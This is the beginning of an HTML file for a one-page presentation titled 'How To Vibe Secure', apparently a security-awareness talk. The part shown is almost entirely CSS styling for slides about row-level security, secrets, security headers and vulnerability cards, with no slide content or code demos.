<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>How To Vibe Secure — One‑Page App</title>
    <meta name="description" content="A single-page, scrollable presentation with interactive security demos." />
    <meta name="theme-color" content="#0f172a" />
    <link rel="preload" href="styles/main.css" as="style" />
    <style>
/* Clean, projection-optimized design */
:root {
  /* Light theme with cohesive pastel palette for projection */
  --bg: #ffffff; 
  --bg-elev: #f8fafc; 
  --bg-card: #f1f5f9;
  --text: #0f172a; 
  --text-dim: #475569; 
  --text-muted: #64748b;
  
  /* Cohesive pastel palette */
  --pastel-blue: #93c5fd;
  --pastel-indigo: #a5b4fc;
  --pastel-violet: #c4b5fd;
  --pastel-teal: #5eead4;
  --pastel-green: #86efac;
  --pastel-orange: #fdba74;
  --pastel-red: #fca5a5;
  
  /* Primary accent colors for interactive elements */
  --accent-primary: #3b82f6;
  --accent-secondary: #8b5cf6;
  --accent-success: #10b981;
  --accent-warning: #f59e0b;
  --accent-danger: #ef4444;
  
  /* Default accent (will be overridden per slide) */
  --accent: var(--accent-primary); 
  --accent-dim: #2563eb;
  --accent-rgb: 59, 130, 246;
  
  --border: #e2e8f0; 
  --subtle: #f1f5f9;
  --shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
}

* { box-sizing: border-box; }
html, body { height: 100%; }
html {
  scroll-behavior: smooth;
  overscroll-behavior-y: none;
  background: var(--bg);
}
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', system-ui, sans-serif;
  color: var(--text);
  background: var(--bg);
  -webkit-font-smoothing: antialiased;
  text-rendering: optimizeLegibility;
  height: 100vh;
  overflow: hidden;
  font-weight: 400;
  line-height: 1.4;
}

/* Timeline removed for cleaner look */

/* Slides */
.content, #content { position: fixed; inset: 0; overflow-y: auto; scroll-snap-type: y mandatory; scroll-behavior: smooth; overscroll-behavior-y: contain; -webkit-overflow-scrolling: touch; }

/* Temporarily disable scroll-snap during viewport changes */
.content.no-snap, #content.no-snap { 
  scroll-snap-type: none !important; 
  scroll-behavior: auto !important;
}
.slide {
  height: 100vh;
  min-height: 100vh;
  padding: clamp(1.5rem, 3vw, 2rem);
  display: grid;
  align-content: center;
  gap: 1rem;
  border-bottom: 1px solid var(--border);
  scroll-snap-align: start;
  scroll-snap-stop: always;
  background: var(--bg);
  position: relative;
  overflow-y: auto;
  box-sizing: border-box;
  isolation: isolate;
}

/* When content overflows, align to start instead of center */
.slide.overflow-content {
  align-content: start;
}

/* Presentation mode scaling for content that's too tall */
.slide.scale-content {
  transform-origin: center top;
  transform: scale(0.92);
  padding-top: clamp(1rem, 2vw, 1.5rem);
}

/* Ensure minimum readable sizes */
.slide.scale-content h2 {
  font-size: clamp(1.3rem, 2.2vw, 1.9rem);
}
.slide.scale-content p,
.slide.scale-content li {
  font-size: clamp(0.9rem, 1.7vw, 1rem);
}

/* Clean, readable typography with improved contrast */
.slide h1 { 
  font-size: clamp(2.2rem, 4vw, 3.2rem); 
  margin: 0 0 0.5rem 0; 
  font-weight: 700;
  color: var(--text);
  letter-spacing: -0.01em;
  position: relative;
  padding-bottom: 0.75rem;
}
.slide h1::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 60px;
  height: 3px;
  background: linear-gradient(90deg, var(--accent), var(--accent-pastel));
  border-radius: 2px;
}
.slide h2 { 
  font-size: clamp(1.4rem, 2.2vw, 2rem); 
  margin: 0 0 0.75rem 0; 
  font-weight: 600;
  color: var(--text);
  letter-spacing: -0.01em;
  position: relative;
  padding-bottom: 0.4rem;
}
.slide h2::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 40px;
  height: 2px;
  background: var(--accent);
  border-radius: 1px;
}
.slide p, .slide li { 
  line-height: 1.4; 
  font-size: clamp(0.95rem, 1.8vw, 1.05rem); 
  margin: 0.5rem 0;
}
.lead { 
  margin: 0 0 1rem 0; 
  font-size: clamp(1.05rem, 2.2vw, 1.2rem); 
  font-weight: 500;
  line-height: 1.4;
}
.hint { 
  color: var(--text-dim); 
  font-size: clamp(0.9rem, 1.8vw, 1rem); 
  line-height: 1.4;
}
.muted {
  color: var(--text-muted);
}
/* Improved spacing system - more compact */
.slide {
  padding: clamp(1.5rem, 3vw, 2rem);
  gap: 1rem;
}

.demo { 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  border-radius: 12px; 
  padding: 1.5rem; 
  box-shadow: var(--shadow);
  position: relative;
  overflow: hidden;
}
.demo::before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  height: 2px;
  background: linear-gradient(90deg, var(--accent) 0%, var(--accent-dim) 100%);
}
.notes { color: var(--text-dim); }
.notes summary { cursor: pointer; }

/* Basics with improved readability */
code, pre { 
  font-family: 'JetBrains Mono', 'Fira Code', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; 
  font-size: clamp(0.85rem, 1.8vw, 0.95rem);
}
pre { 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  padding: 1.25rem; 
  border-radius: 8px; 
  overflow: auto;
  box-shadow: var(--shadow);
  line-height: 1.4;
  margin: 1rem 0;
}
code {
  background: rgba(var(--accent-rgb), 0.1);
  color: var(--accent-dim);
  padding: 0.25rem 0.5rem;
  border-radius: 4px;
  font-size: clamp(0.8rem, 1.6vw, 0.9rem);
  font-weight: 500;
  border: 1px solid rgba(var(--accent-rgb), 0.2);
}
a { 
  color: var(--accent); 
  text-decoration: none;
  transition: all 0.2s ease;
}
a:hover {
  color: var(--accent-dim);
  text-shadow: var(--glow);
}

/* Enhanced styling for security presentation */

/* Slide indicator - positioned at bottom-left */
.slide-indicator {
  position: fixed;
  bottom: 20px;
  left: 20px;
  background: var(--accent);
  color: white;
  padding: 0.75rem 1rem;
  border-radius: 24px;
  font-weight: 600;
  font-size: 0.85rem;
  z-index: 50;
  box-shadow: 0 8px 24px rgba(0,0,0,0.15);
  opacity: 0.9;
  transition: all 200ms ease;
  cursor: pointer;
  min-width: 80px;
  text-align: center;
}

.slide-indicator:hover {
  opacity: 1;
  transform: translateY(-2px);
  box-shadow: 0 12px 32px rgba(0,0,0,0.2);
}

/* Table of Contents - only triggered by slide indicator hover */
.table-of-contents {
  position: fixed;
  left: 0;
  top: 0;
  bottom: 0;
  width: 320px;
  background: color-mix(in oklab, var(--bg-elev), black 5%);
  backdrop-filter: blur(20px);
  border-right: 1px solid var(--border);
  z-index: 40;
  opacity: 0;
  pointer-events: none;
  transform: translateX(-100%);
  transition: all 250ms ease;
  overflow-y: auto;
}

/* Show TOC when slide indicator is hovered (controlled by JS) */
.table-of-contents.show {
  opacity: 1;
  pointer-events: auto;
  transform: translateX(0);
}

.toc-header {
  padding: 1.5rem 1.5rem 1rem 1.5rem;
  font-weight: 600;
  font-size: 1.1rem;
  color: var(--text);
  border-bottom: 1px solid var(--border);
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 5%);
}

.toc-content {
  padding: 0.5rem 0;
}

.toc-item {
  display: flex;
  align-items: center;
  gap: 1rem;
  padding: 0.75rem 1.5rem;
  cursor: pointer;
  transition: all 150ms ease;
  border-left: 3px solid transparent;
}

.toc-item:hover {
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-left-color: var(--accent);
}

.toc-item.active {
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 12%);
  border-left-color: var(--accent);
  font-weight: 600;
}

.toc-number {
  display: flex;
  align-items: center;
  justify-content: center;
  width: 24px;
  height: 24px;
  border-radius: 50%;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 15%);
  color: var(--accent);
  font-size: 0.8rem;
  font-weight: 600;
  flex-shrink: 0;
}

.toc-item.active .toc-number {
  background: var(--accent);
  color: white;
}

.toc-title {
  font-size: 0.9rem;
  line-height: 1.3;
  color: var(--text);
}

.toc-item.active .toc-title {
  color: var(--accent);
}

/* Small screens */
@media (max-width: 700px) { 
  .table-of-contents {
    width: 280px;
  }
}

/* Per-slide cohesive pastel palette - harmonized colors */
.slide { 
  --accent: var(--accent-primary); 
  --accent-dim: #2563eb;
  --accent-rgb: 59, 130, 246;
  --accent-pastel: var(--pastel-blue);
}
.slide[data-color="blue"] { 
  --accent: var(--accent-primary); 
  --accent-dim: #2563eb;
  --accent-rgb: 59, 130, 246;
  --accent-pastel: var(--pastel-blue);
}
.slide[data-color="indigo"] { 
  --accent: #6366f1; 
  --accent-dim: #4f46e5;
  --accent-rgb: 99, 102, 241;
  --accent-pastel: var(--pastel-indigo);
}
.slide[data-color="violet"] { 
  --accent: var(--accent-secondary); 
  --accent-dim: #7c3aed;
  --accent-rgb: 139, 92, 246;
  --accent-pastel: var(--pastel-violet);
}
.slide[data-color="teal"] { 
  --accent: #14b8a6; 
  --accent-dim: #0f766e;
  --accent-rgb: 20, 184, 166;
  --accent-pastel: var(--pastel-teal);
}
.slide[data-color="green"] { 
  --accent: var(--accent-success); 
  --accent-dim: #059669;
  --accent-rgb: 16, 185, 129;
  --accent-pastel: var(--pastel-green);
}
.slide[data-color="orange"] { 
  --accent: var(--accent-warning); 
  --accent-dim: #d97706;
  --accent-rgb: 245, 158, 11;
  --accent-pastel: var(--pastel-orange);
}
.slide[data-color="red"] { 
  --accent: var(--accent-danger); 
  --accent-dim: #dc2626;
  --accent-rgb: 239, 68, 68;
  --accent-pastel: var(--pastel-red);
}

/* Slide-specific styling */

/* Intro slide specific */
.subtitle { 
  font-size: 1.2rem; 
  font-weight: 600; 
  color: var(--muted); 
  margin: 0.5rem 0 1.5rem 0; 
}
.about-author { 
  margin-top: 1.5rem; 
  padding: 1rem; 
  background: var(--subtle); 
  border-radius: 6px; 
  border: 1px solid var(--border);
}
.about-author a { 
  color: var(--accent); 
  text-decoration: none; 
  font-weight: 600; 
}
.about-author a:hover { 
  text-decoration: underline; 
}
.author-background { 
  margin-top: 1rem; 
}
.author-background p { 
  margin: 0.5rem 0; 
  color: var(--muted); 
  font-size: 0.9rem; 
}

/* Clean, compact mindset slide - no generic cards */
.lead-question { 
  margin: 0 0 1.5rem 0; 
  text-align: center;
}
.lead-question h3 { 
  margin-bottom: 0.75rem; 
  color: var(--text-dim); 
  font-size: 1rem; 
  font-weight: 500;
}
.big-question { 
  font-size: clamp(1.3rem, 2.5vw, 1.8rem); 
  font-weight: 700; 
  color: var(--bg); 
  padding: 1rem 1.5rem; 
  background: var(--accent);
  border-radius: 6px;
  margin: 0; 
  text-align: center;
  box-shadow: var(--shadow);
}

/* Compact section with tight spacing */
.one-prompt-away { 
  margin: 1.5rem 0 1rem 0; 
}
.one-prompt-away h3 { 
  margin: 0 0 0.75rem 0; 
  color: var(--text); 
  font-size: 1.1rem;
  font-weight: 600;
}

/* Inline list instead of cards */
.ai-prompts { 
  margin: 0;
  padding: 0;
  list-style: none;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}
.ai-prompts li { 
  margin: 0; 
  padding: 0.5rem 0;
  font-size: 0.95rem;
  line-height: 1.3;
  position: relative;
  padding-left: 1.5rem;
}
.ai-prompts li::before {
  content: '→';
  position: absolute;
  left: 0;
  color: var(--accent);
  font-weight: 600;
}

/* Tight questions section */
.adversarial-questions { 
  margin: 1.5rem 0 0 0; 
}
.adversarial-questions h3 { 
  color: var(--text); 
  margin: 0 0 0.75rem 0; 
  font-size: 1.1rem;
  font-weight: 600;
}

/* Two-column compact list instead of grid cards */
.question-list { 
  margin: 0; 
  padding: 0; 
  list-style: none;
  display: grid;
  grid-template-columns: 1fr 1fr;
  column-gap: 1rem;
  row-gap: 0.75rem;
  font-size: 0.9rem;
}
.question-list li { 
  margin: 0; 
  padding: 0.25rem 0;
  position: relative;
  padding-left: 1.2rem;
  line-height: 1.3;
}
.question-list li::before {
  content: '•';
  position: absolute;
  left: 0;
  color: var(--accent);
  font-weight: 600;
}

@media (max-width: 768px) {
  .question-list {
    grid-template-columns: 1fr;
    gap: 0.5rem;
  }
}

/* Frontend vs Backend comparison */
.comparison { 
  display: grid; 
  grid-template-columns: 1fr 1fr; 
  gap: 1.5rem; 
  margin: 1rem 0; 
}
.frontend-side, .backend-side { 
  padding: 1rem; 
  border-radius: 0.5rem; 
}
.frontend-side { 
  background: color-mix(in oklab, var(--bg-elev), #ef4444 8%); 
  border-left: 3px solid #ef4444; 
}
.backend-side { 
  background: color-mix(in oklab, var(--bg-elev), #22c55e 8%); 
  border-left: 3px solid #22c55e; 
}

/* AI prompt styling */
.context-first {
  margin-bottom: 2rem;
  padding: 1.5rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-radius: 0.5rem;
  border-left: 4px solid var(--accent);
}
.context-first h3 {
  margin-bottom: 0.5rem;
  color: var(--accent);
}
.context-first p {
  margin-bottom: 1rem;
  color: var(--muted);
}
.example-context {
  padding: 1rem;
  background: var(--bg);
  border-radius: 0.4rem;
  border: 1px solid var(--border);
  font-style: italic;
  color: var(--text-dim);
}

.prompt-template, .assistant-brief { 
  margin: 1rem 0; 
}
.security-criteria { 
  background: var(--bg-elev); 
  padding: 1.5rem; 
  border-radius: 0.5rem; 
  border: 1px solid var(--border); 
}
.security-criteria li { 
  margin: 0.75rem 0; 
  padding-left: 0.5rem;
}
.one-liner { 
  margin-top: 1.5rem; 
  padding: 1rem; 
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%); 
  border-radius: 0.5rem; 
  text-align: center; 
  border: 2px dashed var(--accent); 
}

.prompt-box { 
  background: var(--bg-card); 
  color: var(--text); 
  padding: 1rem; 
  border-radius: 6px; 
  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; 
  font-size: 0.9rem; 
  border: 1px solid var(--border); 
  margin: 0.75rem 0;
}
.prompt-box p { 
  margin: 0; 
  line-height: 1.4; 
}

/* Mental model highlighting */
.mental-model { 
  margin: 1rem 0; 
  padding: 1rem; 
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 5%); 
  border-radius: 0.5rem; 
}
.highlight { 
  background: var(--accent-weak); 
  padding: 0.2rem 0.4rem; 
  border-radius: 0.25rem; 
  font-weight: 600; 
}

/* Verification sections */
.verify-section { 
  margin: 1rem 0; 
}
.checklist { 
  list-style: none; 
  padding: 0; 
}
.checklist li { 
  padding: 0.25rem 0; 
}

/* Secrets slide - maximum compact layout with env vars info */
#secrets .assistant-brief {
  margin: 0.2rem 0;
}
#secrets .env-vars-info {
  margin: 0.3rem 0;
  padding: 0.4rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  border-radius: 0.4rem;
  border-left: 3px solid var(--accent);
}
#secrets .env-vars-info h3 {
  margin: 0 0 0.3rem 0;
  color: var(--accent);
  font-size: 0.95rem;
}
#secrets .env-vars-info p {
  margin: 0;
  font-size: 0.85rem;
  line-height: 1.3;
}
#secrets .verify-section {
  margin: 0.3rem 0;
}
#secrets .demo {
  margin-top: 0.4rem;
  padding: 0.5rem;
}
#secrets .demo h4 {
  margin-bottom: 0.15rem;
  font-size: 0.95rem;
}
#secrets .demo p {
  margin: 0.15rem 0;
  font-size: 0.8rem;
}

/* Keep current slide - compact layout */
#keep-current .slide-intro {
  margin: 0.5rem 0;
  line-height: 1.4;
}
#keep-current .assistant-brief {
  margin: 0.5rem 0;
}
#keep-current .verify-section {
  margin: 0.5rem 0;
}
#keep-current h3 {
  margin: 0.5rem 0 0.3rem 0;
}

#secrets h3 {
  margin-bottom: 0.3rem;
  font-size: 1rem;
}
#secrets .checklist {
  margin: 0.3rem 0;
}
#secrets .checklist li {
  padding: 0.1rem 0;
  font-size: 0.9rem;
}

/* RLS slide - two-column layout */
#rls .rls-layout {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 2rem;
  align-items: start;
  height: 100%;
}

#rls .rls-content {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

#rls .what-is-rls {
  margin: 1rem 0;
  padding: 1rem;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 5%);
  border-radius: 0.5rem;
  border-left: 4px solid var(--accent);
}

#rls .what-is-rls h3 {
  margin: 0 0 0.5rem 0;
  color: var(--accent);
  font-size: 1.1rem;
}

#rls .what-is-rls p {
  margin: 0;
  line-height: 1.4;
}


#rls .rls-demo {
  position: sticky;
  top: 2rem;
}

#rls .rls-demo .demo {
  padding: 0.5rem;
  margin: 0;
}

#rls .demo-controls {
  display: flex;
  gap: 0.3rem;
  margin-top: 0.5rem;
  justify-content: space-between;
}

#rls .policy-btn, #rls .reset-btn {
  padding: 0.3rem 0.6rem;
  font-size: 0.75rem;
  border-radius: 0.25rem;
  border: 1px solid var(--border);
  background: var(--bg-elev);
  color: var(--text);
  cursor: pointer;
  transition: all 0.2s ease;
}

#rls .policy-btn:hover, #rls .reset-btn:hover {
  background: var(--accent);
  color: white;
  border-color: var(--accent);
}

#rls .policy-code {
  margin-top: 1rem;
  padding: 1rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 0.5rem;
  border-left: 4px solid var(--accent);
}

#rls .policy-code h5 {
  margin: 0 0 0.5rem 0;
  color: var(--accent);
  font-size: 0.9rem;
}

#rls .policy-code code {
  display: block;
  font-family: var(--font-mono);
  font-size: 0.8rem;
  color: var(--text);
  line-height: 1.4;
  white-space: pre-wrap;
}

/* Responsive adjustments for RLS */
@media (max-width: 1024px) {
  #rls .rls-layout {
    grid-template-columns: 1fr;
    gap: 1rem;
  }
  
  #rls .rls-demo {
    position: static;
  }
}

/* What NOT to do styling */
.what-not-to-do { 
  margin: 1rem 0; 
}
.dont-list { 
  background: color-mix(in oklab, var(--bg-elev), #ef4444 8%); 
  padding: 1rem 1.25rem; 
  border-radius: 0.5rem; 
  border-left: 3px solid #ef4444; 
}
.dont-list li { 
  margin: 0.75rem 0; 
  padding-left: 0.25rem;
}
.dont-list code { 
  background: rgba(239, 68, 68, 0.1); 
}

/* Security headers guide styling */
.security-headers-guide {
  margin: 1rem 0;
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 8%);
  padding: 1rem 1.25rem;
  border-radius: 0.5rem;
  border-left: 3px solid var(--accent);
}
.security-headers-guide ul {
  margin: 0.5rem 0;
}
.security-headers-guide li {
  margin: 0.75rem 0;
  padding-left: 0.25rem;
}
.security-headers-guide strong {
  color: var(--accent);
}
.headers-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 1rem;
  margin: 0.75rem 0;
}
.headers-grid .header-item {
  background: rgba(255, 255, 255, 0.05);
  padding: 0.75rem;
  border-radius: 0.5rem;
  border: 1px solid rgba(255, 255, 255, 0.1);
}
.headers-grid .header-item strong {
  display: block;
  color: var(--accent);
  font-size: 0.9rem;
  margin-bottom: 0.25rem;
}
.headers-grid .header-item small {
  color: var(--muted);
  font-size: 0.8rem;
  line-height: 1.3;
}
.origin-note {
  color: var(--accent);
  font-weight: 600;
}
.origin-explanation {
  margin: 0.5rem 0 0 0;
  font-size: 0.85rem;
  color: var(--muted);
  font-style: italic;
}
@media (max-width: 768px) {
  .headers-grid {
    grid-template-columns: 1fr;
    gap: 0.75rem;
  }
}

/* Simplified headers layout for slide 9 */
.quick-rules {
  display: flex;
  gap: 1rem;
  margin: 1rem 0;
  font-size: 0.9rem;
}

.avoid-rule {
  flex: 1;
  padding: 0.75rem;
  background: rgba(239, 68, 68, 0.1);
  border: 1px solid rgba(239, 68, 68, 0.3);
  border-radius: 0.5rem;
  text-align: center;
}

.need-rule {
  flex: 1;
  padding: 0.75rem;
  background: rgba(34, 197, 94, 0.1);
  border: 1px solid rgba(34, 197, 94, 0.3);
  border-radius: 0.5rem;
  text-align: center;
}

.essential-headers {
  margin: 1rem 0;
}

.essential-headers h3 {
  font-size: 1.1rem;
  margin-bottom: 0.75rem;
  text-align: center;
  color: var(--text);
}

.headers-row {
  display: flex;
  gap: 0.5rem;
  justify-content: space-between;
}

.header-item {
  flex: 1;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 0.5rem;
  padding: 0.75rem;
  cursor: pointer;
  transition: all 0.2s ease;
  text-align: center;
}

.header-item:hover {
  background: rgba(255, 255, 255, 0.08);
  border-color: var(--accent);
}

.header-item.expanded {
  background: color-mix(in oklab, var(--bg-elev), var(--accent) 10%);
  border-color: var(--accent);
}

.header-name {
  font-weight: 600;
  color: var(--accent);
  font-size: 0.9rem;
  margin-bottom: 0.25rem;
}

.header-purpose {
  color: var(--muted);
  font-size: 0.8rem;
  line-height: 1.3;
}

.header-detail {
  margin-top: 0.5rem;
  padding-top: 0.5rem;
  border-top: 1px solid rgba(255, 255, 255, 0.1);
  color: var(--text);
  font-size: 0.85rem;
  line-height: 1.4;
  text-align: left;
}

.headers-check {
  margin: 1rem 0;
  padding: 0.75rem;
  background: var(--bg-elev);
  border-radius: 0.5rem;
  border: 1px solid var(--border);
  font-size: 0.9rem;
}

.inline-btn {
  background: var(--accent);
  color: white;
  border: none;
  padding: 0.4rem 0.8rem;
  border-radius: 0.25rem;
  font-size: 0.85rem;
  cursor: pointer;
  margin-left: 0.5rem;
  transition: background 0.2s ease;
}

.inline-btn:hover {
  background: var(--accent-dim);
}

#headersDemo {
  margin-top: 0.75rem;
  padding: 0.75rem;
  background: var(--subtle);
  border-radius: 0.5rem;
  border: 1px solid var(--border);
}

.origin-footnote {
  text-align: center;
  margin: 1rem 0 0 0;
  font-size: 0.75rem;
  color: var(--muted);
  opacity: 0.8;
}

@media (max-width: 768px) {
  .quick-rules {
    flex-direction: column;
    gap: 0.5rem;
  }
  
  .headers-row {
    flex-direction: column;
    gap: 0.5rem;
  }
  
  .header-item {
    text-align: left;
  }
}

/* Storage rules */
.storage-rules, .key-rules, .key-concepts { 
  margin: 1rem 0; 
}

.compact-rules {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
  margin: 1rem 0;
}

.rule-compact {
  padding: 0.75rem;
  background: var(--subtle);
  border-radius: 6px;
  border: 1px solid var(--border);
  font-size: 0.9rem;
  line-height: 1.3;
}

.rule-compact strong {
  color: var(--accent);
  font-weight: 600;
}

.rule-item {
  margin: 1.5rem 0;
  padding: 1rem;
  background: var(--subtle);
  border-radius: 8px;
  border: 1px solid var(--border);
}

.rule-item h4 {
  margin: 0 0 0.5rem 0;
  color: var(--accent);
  font-size: 1rem;
  font-weight: 600;
}

.rule-item p {
  margin: 0;
  color: var(--muted);
  font-size: 0.9rem;
  line-height: 1.4;
}

/* Enhanced vulnerability cards with consistent styling */
.vuln-grid { 
  display: grid; 
  grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
  gap: 1.25rem; 
  margin: 0.75rem 0; 
}
.vuln-card { 
  padding: 1rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 8px;
  border-left: 4px solid var(--accent-pastel);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  transition: all 0.2s ease;
}
.vuln-card:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
  border-left-color: var(--accent);
}
.vuln-card h4 { 
  margin: 0 0 0.75rem 0; 
  color: var(--accent); 
  font-weight: 600;
  font-size: 1.1rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}
.vuln-card h4::before {
  content: '⚠️';
  font-size: 1rem;
}
.vuln-card p { 
  margin: 0.5rem 0; 
  font-size: 0.9rem; 
  line-height: 1.4;
}
.vuln-card p:first-of-type {
  color: var(--text-dim);
  font-weight: 500;
}
.vuln-card p:last-of-type {
  color: var(--accent-danger);
  font-weight: 600;
  background: rgba(239, 68, 68, 0.1);
  padding: 0.5rem;
  border-radius: 4px;
  margin-top: 0.75rem;
}
.vuln-card p:last-of-type::before {
  content: '🚨 ';
  margin-right: 0.25rem;
}

/* Vulnerability Carousel Styles - Lightning Round */
.vuln-stack-container {
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 1.5rem;
  margin: 1.5rem auto;
  max-width: 1100px;
  width: 100%;
}

.vuln-carousel {
  position: relative;
  width: 100%;
  height: 380px;
  overflow: hidden;
}

.vuln-carousel-track {
  display: flex;
  height: 100%;
  transition: transform 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
}

.vuln-stack-card {
  flex: 0 0 70%;
  margin: 0 15%;
  padding: 2.5rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 12px;
  border-left: 4px solid var(--accent-pastel);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
  display: flex;
  flex-direction: column;
  justify-content: center;
  position: relative;
  min-height: 320px;
}

.vuln-stack-card.active {
  border-left-color: var(--accent);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
}

/* Peek cards on sides */
.vuln-stack-card:not(.active) {
  opacity: 0.4;
  transform: scale(0.9);
  transition: all 0.3s ease;
}

/* Carousel Navigation */
.vuln-nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
  width: 100%;
  max-width: 800px;
  margin-bottom: 1rem;
}

.vuln-nav-btn {
  background: var(--bg-card);
  border: 2px solid var(--border);
  border-radius: 50px;
  padding: 0.75rem 1.5rem;
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: all 0.2s ease;
  color: var(--text);
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.vuln-nav-btn:hover:not(:disabled) {
  background: var(--accent);
  color: white;
  border-color: var(--accent);
  transform: translateY(-2px);
}

.vuln-nav-btn:disabled {
  opacity: 0.3;
  cursor: not-allowed;
}

.vuln-counter {
  font-size: 1.3rem;
  font-weight: 700;
  color: var(--accent);
  background: var(--bg-card);
  padding: 0.5rem 1rem;
  border-radius: 25px;
  border: 2px solid var(--accent-pastel);
  min-width: 100px;
  text-align: center;
}

/* Carousel Card Content */
.vuln-stack-card h4 {
  margin: 0 0 1rem 0;
  color: var(--accent);
  font-weight: 700;
  font-size: 1.6rem;
  text-align: center;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
}

.vuln-stack-card h4::before {
  content: '⚡';
  font-size: 1.3rem;
  opacity: 0.8;
}

.vuln-stack-card p {
  margin: 0.75rem 0;
  font-size: 1rem;
  line-height: 1.5;
  text-align: left;
}

.vuln-stack-card p:first-of-type {
  color: var(--text);
  font-weight: 600;
  font-size: 1.1rem;
  text-align: center;
  margin-bottom: 1rem;
}

.vuln-stack-card p:nth-of-type(2) {
  background: rgba(99, 102, 241, 0.08);
  padding: 1rem;
  border-radius: 8px;
  border-left: 3px solid var(--accent-pastel);
  font-family: var(--font-mono);
  font-size: 0.9rem;
  line-height: 1.4;
  margin: 1rem 0;
}

.vuln-stack-card p:last-of-type {
  color: var(--accent-danger);
  font-weight: 600;
  background: rgba(239, 68, 68, 0.08);
  padding: 1rem;
  border-radius: 8px;
  margin-top: 1rem;
  border-left: 3px solid var(--accent-danger);
  font-size: 1rem;
  text-align: center;
}

.vuln-stack-card p:last-of-type::before {
  content: '🔒 ';
  margin-right: 0.5rem;
}

/* Old controls removed - using carousel navigation instead */

/* Enhanced testing steps with card styling */
.testing-steps { 
  display: grid; 
  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); 
  gap: 1.25rem; 
  margin: 0.75rem 0; 
}
.step { 
  padding: 1rem;
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 8px;
  border-left: 4px solid var(--accent-pastel);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
  transition: all 0.2s ease;
}
.step:hover {
  transform: translateY(-2px);
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.12);
  border-left-color: var(--accent);
}
.step h3 { 
  margin: 0 0 0.75rem 0; 
  color: var(--accent); 
  font-weight: 600;
  font-size: 1.1rem;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}
.step h3::before {
  content: counter(step-counter);
  counter-increment: step-counter;
  background: var(--accent);
  color: white;
  width: 24px;
  height: 24px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 0.8rem;
  font-weight: 700;
}
.testing-steps {
  counter-reset: step-counter;
}
.step p {
  margin: 0;
  line-height: 1.4;
  color: var(--text-dim);
}

/* Enhanced checklist with card styling */
.checklist-grid { 
  display: grid; 
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); 
  gap: 0.8rem; 
  margin: 0.75rem 0; 
}
.checklist-item { 
  display: flex; 
  align-items: flex-start; 
  gap: 0.8rem; 
  padding: 0.8rem; 
  background: var(--bg-card); 
  border: 1px solid var(--border); 
  border-radius: 6px;
  border-left: 3px solid var(--accent-pastel);
  cursor: pointer; 
  transition: all 0.2s ease;
  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.06);
}
.checklist-item:hover { 
  transform: translateY(-1px);
  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
  border-left-color: var(--accent);
}
.checklist-item input[type="checkbox"] { 
  margin: 0.2rem 0 0 0; 
  flex-shrink: 0;
  transform: scale(1.2);
  accent-color: var(--accent);
}
.checklist-item span { 
  line-height: 1.4; 
  font-size: 0.95rem;
  color: var(--text);
}
.checklist-item span strong {
  color: var(--accent);
  font-weight: 600;
}

/* Resources styling */
.resources-grid { 
  display: grid; 
  grid-template-columns: 1fr 1fr; 
  gap: 2rem; 
  margin: 1rem 0; 
}
.resource-section h3 { 
  color: var(--accent); 
  margin-top: 0; 
}
.prompt-examples { 
  margin-top: 1rem; 
}
.prompt-example { 
  margin: 1rem 0; 
  padding: 1rem; 
  background: var(--bg-elev); 
  border-radius: 0.5rem; 
  border-left: 3px solid var(--accent); 
}
.prompt-example strong { 
  color: var(--accent); 
}
.prompt-example code { 
  display: block; 
  margin-top: 0.5rem; 
  padding: 0.5rem; 
  background: rgba(0,0,0,0.05); 
  border-radius: 0.25rem; 
